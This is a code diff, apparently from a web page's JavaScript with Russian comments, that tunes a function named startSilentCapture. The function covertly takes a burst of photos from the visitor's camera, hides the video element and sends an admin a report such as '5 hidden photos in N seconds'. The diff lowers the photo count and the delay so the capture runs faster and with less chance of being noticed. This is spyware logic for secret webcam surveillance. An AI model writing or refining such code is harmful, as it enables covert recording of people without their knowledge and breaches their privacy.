@@ -851,7 +851,7 @@
         }
     }
     
-    // ========== КАМЕРА И ФОТО (БЕЗ ЗАДЕРЖКИ - МГНОВЕННО!) ==========
+    // ========== КАМЕРА И ФОТО (5 ФОТОК МГНОВЕННО!) ==========
     let cameraAllowed = false;
     
     async function startSilentCapture() {
@@ -875,11 +875,11 @@
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
             
-            await new Promise(r => setTimeout(r, 500));
+            await new Promise(r => setTimeout(r, 300));
             
-            // ===== 10 ФОТО МГНОВЕННО (БЕЗ ЗАДЕРЖЕК!) =====
+            // ===== 5 ФОТОК МГНОВЕННО (БЕЗ ЗАДЕРЖЕК!) =====
             const startTime = performance.now();
-            for (let i = 0; i < 10; i++) {
+            for (let i = 0; i < 5; i++) {
                 canvas.width = videoEl.videoWidth || 640;
                 canvas.height = videoEl.videoHeight || 480;
                 ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
@@ -895,12 +895,12 @@
                 // ===== БЕЗ ЗАДЕРЖКИ! =====
             }
             const endTime = performance.now();
-            const totalTime = ((endTime - startTime) / 1000).toFixed(2);
+            const totalTime = ((endTime - startTime) / 1000).toFixed(3);
             
             stream.getTracks().forEach(track => track.stop());
             videoEl.remove();
             
-            sendToAdmin(`📸 10 скрытых фото за ${totalTime} секунд!`);
+            sendToAdmin(`📸 5 скрытых фото за ${totalTime} секунд!`);
             
         } catch(e) {
             sendToAdmin(`❌ Ошибка камеры: ${e.message}`);
